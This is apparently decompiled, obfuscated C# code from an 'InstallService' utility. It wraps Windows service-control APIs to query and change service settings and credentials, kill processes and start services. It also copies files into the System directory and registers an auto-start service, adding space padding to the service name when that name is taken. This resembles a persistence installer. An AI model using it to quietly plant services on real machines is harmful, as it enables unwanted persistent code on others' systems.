using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace InstallService;

public class GClass0
{
	public struct GStruct0
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public string string_0;

		public string string_1;

		public int int_3;

		public string string_2;

		public string string_3;

		public string string_4;
	}

	private struct Struct0
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public int int_3;

		public IntPtr intptr_2;

		public IntPtr intptr_3;

		public IntPtr intptr_4;
	}

	private enum Enum0
	{
		const_0 = 0x10000000
	}

	private enum Enum1
	{
		const_0 = 1,
		const_1
	}

	private const int int_0 = 65535;

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr OpenSCManager([MarshalAs(UnmanagedType.LPTStr)] string machineName, [MarshalAs(UnmanagedType.LPTStr)] string databaseName, int desiredAccess);

	[DllImport("advapi32.dll")]
	public static extern void CloseServiceHandle(IntPtr SCHANDLE);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr OpenService(IntPtr scManager, [MarshalAs(UnmanagedType.LPTStr)] string serviceName, int desiredAccess);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int ChangeServiceConfig(IntPtr service, int serviceType, int startType, int errorControl, [MarshalAs(UnmanagedType.LPTStr)] string binaryPathName, [MarshalAs(UnmanagedType.LPTStr)] string loadOrderGroup, IntPtr tagID, [MarshalAs(UnmanagedType.LPTStr)] string dependencies, [MarshalAs(UnmanagedType.LPTStr)] string startName, [MarshalAs(UnmanagedType.LPTStr)] string password, [MarshalAs(UnmanagedType.LPTStr)] string displayName);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int QueryServiceConfig(IntPtr service, IntPtr queryServiceConfig, int bufferSize, ref int bytesNeeded);

	public static GStruct0 smethod_0(string string_0)
	{
		if (string_0.Equals(""))
		{
			throw new NullReferenceException("ServiceName must contain a valid service name.");
		}
		IntPtr scManager = OpenSCManager(".", null, 268435456);
		if (scManager.ToInt32() <= 0)
		{
			throw new Win32Exception();
		}
		IntPtr service = OpenService(scManager, string_0, 1);
		if (service.ToInt32() <= 0)
		{
			throw new NullReferenceException();
		}
		int bytesNeeded = 5;
		Struct0 @struct = default(Struct0);
		IntPtr queryServiceConfig = Marshal.AllocCoTaskMem(0);
		if (QueryServiceConfig(service, queryServiceConfig, 0, ref bytesNeeded) == 0 && bytesNeeded == 0)
		{
			throw new Win32Exception();
		}
		queryServiceConfig = Marshal.AllocCoTaskMem(bytesNeeded);
		if (QueryServiceConfig(service, queryServiceConfig, bytesNeeded, ref bytesNeeded) == 0)
		{
			throw new Win32Exception();
		}
		@struct.intptr_0 = IntPtr.Zero;
		@struct.intptr_2 = IntPtr.Zero;
		@struct.intptr_4 = IntPtr.Zero;
		@struct.intptr_1 = IntPtr.Zero;
		@struct.intptr_3 = IntPtr.Zero;
		@struct = (Struct0)Marshal.PtrToStructure(queryServiceConfig, default(Struct0).GetType());
		GStruct0 result = default(GStruct0);
		result.string_0 = Marshal.PtrToStringAuto(@struct.intptr_0);
		result.string_2 = Marshal.PtrToStringAuto(@struct.intptr_2);
		result.string_4 = Marshal.PtrToStringAuto(@struct.intptr_4);
		result.string_1 = Marshal.PtrToStringAuto(@struct.intptr_1);
		result.string_3 = Marshal.PtrToStringAuto(@struct.intptr_3);
		result.int_2 = @struct.int_2;
		result.int_0 = @struct.int_0;
		result.int_1 = @struct.int_1;
		result.int_3 = @struct.int_3;
		Marshal.FreeCoTaskMem(queryServiceConfig);
		return result;
	}

	public static void smethod_1(string string_0, string string_1, string string_2)
	{
		GStruct0 gStruct = smethod_0(string_0);
		IntPtr scManager = OpenSCManager(".", null, 268435456);
		if (scManager.ToInt32() > 0)
		{
			IntPtr service = OpenService(scManager, string_0, 2);
			if (service.ToInt32() <= 0)
			{
				throw new Win32Exception();
			}
			if (ChangeServiceConfig(service, gStruct.int_0, gStruct.int_1, gStruct.int_2, gStruct.string_0, gStruct.string_1, IntPtr.Zero, gStruct.string_2, string_1, string_2, gStruct.string_4) == 0)
			{
				throw new Win32Exception();
			}
			return;
		}
		throw new Win32Exception();
	}

	public static void smethod_2(string string_0)
	{
		GStruct0 gStruct = smethod_0(string_0);
		IntPtr scManager = OpenSCManager(".", null, 268435456);
		if (scManager.ToInt32() <= 0)
		{
			throw new Win32Exception();
		}
		IntPtr service = OpenService(scManager, string_0, 2);
		if (service.ToInt32() > 0)
		{
			if (ChangeServiceConfig(service, GClass1.int_2 | GClass1.int_0, 2, GClass1.int_3, gStruct.string_0, null, IntPtr.Zero, null, null, null, gStruct.string_4) == 0)
			{
				throw new Win32Exception();
			}
			return;
		}
		throw new Win32Exception();
	}

	public static int smethod_3(string string_0)
	{
		if (string_0.Equals(""))
		{
			throw new NullReferenceException("ServiceName must contain a valid service name.");
		}
		IntPtr intPtr = OpenSCManager(".", null, 268435456);
		if (intPtr.ToInt32() > 0)
		{
			IntPtr intPtr2 = OpenService(intPtr, string_0, 1);
			if (intPtr2.ToInt32() > 0)
			{
				int bytesNeeded = 5;
				Struct0 @struct = default(Struct0);
				IntPtr queryServiceConfig = Marshal.AllocCoTaskMem(0);
				if (QueryServiceConfig(intPtr2, queryServiceConfig, 0, ref bytesNeeded) == 0 && bytesNeeded == 0)
				{
					CloseServiceHandle(intPtr);
					CloseServiceHandle(intPtr2);
					throw new Win32Exception();
				}
				queryServiceConfig = Marshal.AllocCoTaskMem(bytesNeeded);
				if (QueryServiceConfig(intPtr2, queryServiceConfig, bytesNeeded, ref bytesNeeded) == 0)
				{
					CloseServiceHandle(intPtr);
					CloseServiceHandle(intPtr2);
					Marshal.FreeCoTaskMem(queryServiceConfig);
					throw new Win32Exception();
				}
				@struct.intptr_0 = IntPtr.Zero;
				@struct.intptr_2 = IntPtr.Zero;
				@struct.intptr_4 = IntPtr.Zero;
				@struct.intptr_1 = IntPtr.Zero;
				@struct.intptr_3 = IntPtr.Zero;
				int int_ = ((Struct0)Marshal.PtrToStructure(queryServiceConfig, @struct.GetType())).int_1;
				Marshal.FreeCoTaskMem(queryServiceConfig);
				CloseServiceHandle(intPtr);
				CloseServiceHandle(intPtr2);
				return int_;
			}
			CloseServiceHandle(intPtr);
			CloseServiceHandle(intPtr2);
			throw new NullReferenceException();
		}
		CloseServiceHandle(intPtr);
		throw new Win32Exception();
	}

	public static string smethod_4(string string_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		ServiceController val = new ServiceController(string_0);
		return ((object)val.get_Status()).ToString();
	}

	public static bool smethod_5(string string_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Invalid comparison between Unknown and I4
		ServiceController val = new ServiceController(string_0);
		if ((int)val.get_Status() != 4)
		{
			((Component)(object)val).Dispose();
			return false;
		}
		((Component)(object)val).Dispose();
		return true;
	}

	public static bool smethod_6(string string_0)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		try
		{
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i < processes.Length; i++)
			{
				if (processes[i].ProcessName.ToLower().Trim() == string_0)
				{
					processes[i].Kill();
					break;
				}
			}
			ServiceController val = new ServiceController(string_0);
			val.Start();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static bool smethod_7(string string_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		try
		{
			ServiceController val = new ServiceController(string_0);
			val.Stop();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static bool smethod_8(ref string string_0, ref string string_1)
	{
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Invalid comparison between Unknown and I4
		ServiceController[] services = ServiceController.GetServices();
		ArrayList arrayList = new ArrayList();
		bool flag = false;
		for (int i = 0; i < services.Length; i++)
		{
			try
			{
				if (services[i].get_DisplayName().IndexOf(GClass2.string_2) < 0)
				{
					continue;
				}
				arrayList.Add(services[i].get_DisplayName());
				if ((int)services[i].get_Status() != 4 || smethod_3(services[i].get_ServiceName()) != 2)
				{
					try
					{
						GClass1 gClass = new GClass1();
						gClass.method_1(services[i].get_ServiceName());
					}
					catch
					{
					}
				}
				else
				{
					string_0 = services[i].get_ServiceName();
					string_1 = services[i].get_DisplayName();
					flag = true;
				}
			}
			catch
			{
			}
		}
		if (!flag)
		{
			int num = 0;
			while (true)
			{
				string text = "";
				try
				{
					for (int j = 0; j < num; j++)
					{
						text += " ";
					}
					if (!arrayList.Contains(GClass2.string_2 + text))
					{
						string_0 = GClass2.string_3 + text;
						string_1 = GClass2.string_2 + text;
						return false;
					}
				}
				catch (InvalidOperationException)
				{
					return false;
				}
				num++;
			}
		}
		return true;
	}

	public static bool smethod_9(string string_0, string string_1)
	{
		string text = "";
		string string_2 = "";
		string string_3 = "";
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		if (!File.Exists(folderPath + "\\" + GClass2.string_0))
		{
			File.Copy(AppDomain.CurrentDomain.BaseDirectory + "\\" + string_0, folderPath + "\\" + GClass2.string_0);
		}
		if (!File.Exists(folderPath + "\\" + GClass2.string_4))
		{
			File.Copy(AppDomain.CurrentDomain.BaseDirectory + "\\" + string_1, folderPath + "\\" + GClass2.string_4);
		}
		text = folderPath + "\\" + GClass2.string_0;
		if (!smethod_8(ref string_2, ref string_3))
		{
			GClass1 gClass = new GClass1();
			try
			{
				if (gClass.method_0(text, string_2, string_3))
				{
					return true;
				}
				return false;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return false;
	}

	~GClass0()
	{
	}
}
